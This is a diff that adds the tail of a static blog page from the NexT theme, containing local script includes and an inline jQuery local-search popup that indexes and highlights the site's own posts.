+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
